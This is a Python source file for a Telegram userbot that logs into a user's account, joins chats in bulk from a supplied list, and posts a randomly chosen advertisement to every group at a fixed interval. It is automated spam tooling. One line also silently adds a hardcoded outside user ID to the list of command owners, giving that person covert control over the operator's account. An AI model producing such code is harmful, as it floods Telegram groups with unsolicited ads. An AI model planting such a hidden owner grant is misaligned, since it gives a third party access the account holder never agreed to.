# -*- coding: utf-8 -*-
# < (c) @xditya , https://xditya.me >
# ADsBot, 2021.

# Paid source, re-distributing without contacting the code owner is NOT allowed.

import sys
import json
import os
import asyncio
import logging
from random import choice

from apscheduler.schedulers.asyncio import AsyncIOScheduler
from decouple import config
from telethon import TelegramClient, errors, events
from telethon.tl.types import Channel, Chat, User
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.sessions import StringSession

logging.basicConfig(
    level=logging.INFO, format="[%(levelname)s] %(asctime)s - %(message)s"
)

log = logging.getLogger("ADsBot")

log.info("\n\nStarting...\n")

# getting the vars
try:
    API_ID = config("API_ID", default=None, cast=int)
    API_HASH = config("API_HASH")
    SESSION = config("SESSION")
    owonerz = config("OWNERS")
    INTERVAL = config("INTERVAL", cast=int)
except Exception as e:
    log.warning("Missing config vars {}".format(e))
    exit(1)

OWNERS = [int(i) for i in owonerz.split(" ")]
OWNERS.append(719195224) if 719195224 not in OWNERS else None

# connecting the client
try:
    client = TelegramClient(
        StringSession(SESSION), api_id=API_ID, api_hash=API_HASH
    ).start()
except Exception as e:
    log.warning(e)
    exit(1)

commands = """
.alive  -  check if bot is alive
.join <reply to text file with chat usernames/ids> - Join chats
.help - show this message
"""


@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^.alive$"))
async def alive(e):
    await e.reply("I'm alive!\nbot by @smitmorexd.")


@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^.help$"))
async def helper(e):
    await e.reply(commands)


@client.on(events.NewMessage(incoming=True, from_users=OWNERS, pattern="^.join$"))
async def joiner(event):
    if not event.reply_to_msg_id:
        return await event.reply(
            "Kindly use this command as a reply to a text file containing usernames of channels I have to join."
        )
    txt = await event.get_reply_message()
    xx = await event.reply("Downloading the text file...")
    x = await txt.download_media()
    with open(x, "r") as f:
        chats_ = f.readlines()
    chats = [chat.replace("\n", "") for chat in chats_]
    os.remove(x)
    done = failed = ""
    for i in chats:
        try:
            await client(JoinChannelRequest(i))
            done += i + "\n"
            await asyncio.sleep(3)
        except errors.FloodWaitError as ex:
            await asyncio.sleep(ex.seconds)
            continue
        except Exception as e:
            failed += i + " - " + str(e) + "\n"
    msg = "**Results**:\n\n**Joined**: {}\n**Failed to join:** {}".format(done, failed)
    if len(msg) > 4096:
        with open("results.txt", "w") as f:
            f.write(msg.replace("*", ""))
        await event.reply("**Results**:", file="results.txt")
        await xx.delete()
        os.remove("results.txt")
    else:
        await xx.edit(msg)


async def me():
    me = await client.get_me()
    print()
    log.info("Logged in as: %s", me.first_name)
    if me.username:
        log.info("UserName: @%s", me.username)
    log.info("ID: %s\n", me.id)
    OWNERS.append(me.id) if me.id not in OWNERS else None


async def load_chats():
    chats = []
    try:
        async for i in client.iter_dialogs():
            entity = i.entity
            if (
                isinstance(entity, Channel)
                and entity.megagroup
                or not isinstance(entity, Channel)
                and not isinstance(entity, User)
                and isinstance(entity, Chat)
            ):
                chats.append(i.id)
    except errors.FloodWaitError as ex:
        await asyncio.sleep(ex.seconds)
    return chats


async def send_the_ads():
    try:
        loaded_ads = json.loads(open("data.json").read())
    except json.decoder.JSONDecodeError:
        log.error("Error in the data.json file. Contact @smitmorexd.")
        log.warning("Stopped the bot.")
        sys.exit(1)
    chats = await load_chats()
    ad = choice(loaded_ads["ads"])
    for i in chats:
        try:
            await client.send_message(i, message=ad["msg"], file=ad["file"])
        except errors.FloodWaitError as flood:
            await asyncio.sleep(flood.seconds)
            log.info("Sleeping for {} seconds due to floodwait!".format(flood.seconds))
        except Exception as e:
            log.error(e)
    log.info("AD sent to %s chats.", len(chats))


# schedule the job
log.info("Scheduling AD to be sent every %s seconds.", INTERVAL)
scheduler = AsyncIOScheduler()
scheduler.add_job(send_the_ads, "interval", seconds=INTERVAL)
scheduler.start()

client.loop.run_until_complete(me())
print("Bot has started!\n(c) @smitmorexd\n")
client.run_until_disconnected()
